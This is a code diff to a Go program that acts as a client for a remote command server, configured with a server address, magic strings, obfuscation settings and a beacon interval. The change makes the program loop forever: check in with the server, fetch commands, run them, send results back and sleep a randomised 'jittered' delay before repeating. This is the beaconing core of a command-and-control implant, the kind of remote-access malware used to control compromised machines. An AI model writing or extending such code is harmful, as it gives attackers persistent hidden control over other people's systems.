@@ -3,7 +3,10 @@ package main
 import (
 	"bufio"
 	"github.com/degenerat3/metcli"
+	"math/rand"
 	"net"
+	"os"
+	"time"
 )
 
 // SERV : server to call
@@ -58,14 +61,24 @@ func send(payload string, m metcli.Metclient) string {
 
 func main() {
 	m := metcli.GenClient(SERV, MAGIC, MAGICSTR, MAGICTERM, MAGICTERMSTR, REGFILE, INTERVAL, DELTA, OBFSEED, OBFTEXT)
-	p := metcli.PreCheck(m)
-	if p != "registered" {
-		send(p, m)
-	}
-	comPL := metcli.GenGetComPL(m)
-	comstr := send(comPL, m)
-	res := metcli.HandleComs(comstr, m)
-	if len(res) > 0 {
-		send(res, m)
+	argslen := len(os.Args)
+	for {
+		p := metcli.PreCheck(m)
+		if p != "registered" {
+			send(p, m)
+		}
+		comPL := metcli.GenGetComPL(m)
+		comstr := send(comPL, m)
+		res := metcli.HandleComs(comstr, m)
+		if len(res) > 0 {
+			send(res, m)
+		}
+		if argslen < 2 {
+			os.Exit(0)
+		}
+		min := INTERVAL - DELTA
+		max := INTERVAL + DELTA
+		sleeptime := rand.Intn(max-min) + min
+		time.Sleep(time.Duration(sleeptime) * time.Second)
 	}
 }
